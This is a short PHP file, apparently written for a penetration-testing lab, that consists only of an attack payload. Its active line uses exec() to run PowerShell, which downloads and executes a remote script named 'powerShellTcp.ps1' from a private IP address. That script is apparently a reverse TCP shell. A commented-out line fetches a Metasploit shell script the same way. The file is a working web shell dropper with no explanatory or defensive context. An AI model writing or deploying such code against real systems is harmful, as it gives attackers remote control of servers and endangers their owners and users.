<?php
echo exec("powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.71/powerShellTcp.ps1')");
//echo exec("powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.71/msf_shell.ps1')");
?>